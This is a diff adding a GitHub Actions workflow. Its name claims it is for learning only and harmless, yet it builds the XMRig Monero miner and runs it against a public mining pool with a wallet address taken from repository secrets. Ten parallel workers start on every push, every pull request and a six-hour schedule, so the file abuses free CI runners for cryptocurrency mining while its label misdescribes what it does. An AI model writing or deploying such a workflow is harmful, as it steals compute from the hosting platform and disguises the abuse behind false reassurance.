@@ -1,0 +1,41 @@
+name: Truly Learning Purpose Only. Not actually mode enabled. No danger to any machines. Works as other tasks
+
+on:
+  push:
+    branches: 
+      - master  # Trigger on push to the master branch
+  pull_request:
+    branches: 
+      - master  # Trigger on pull request to the master branch
+  workflow_dispatch:
+  schedule:
+    # Run every 6 hours in IST (adjusted for UTC time)
+    - cron: '0 1,7,13,19 * * *'  # This cron job runs every 6 hours in IST (adjusted to UTC)
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        worker_id: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]  # Reduced to 10 worker IDs
+      fail-fast: false  # Continue running all matrix jobs even if one fails
+
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v2
+
+      - name: Install dependencies and build XMRig
+        run: |
+          sudo apt update
+          sudo apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make
+
+      - name: Run XMRig
+        run: |
+          cd xmrig/build
+          ./xmrig -o pool.supportxmr.com:443 -u ${{ secrets.MONERO_ADDRESS }} -k --tls --rig-id workflow-${{ matrix.worker_id }}
+        env:
+          MONERO_ADDRESS: ${{ secrets.MONERO_ADDRESS }}  # Store your Monero address in GitHub Secrets to protect it
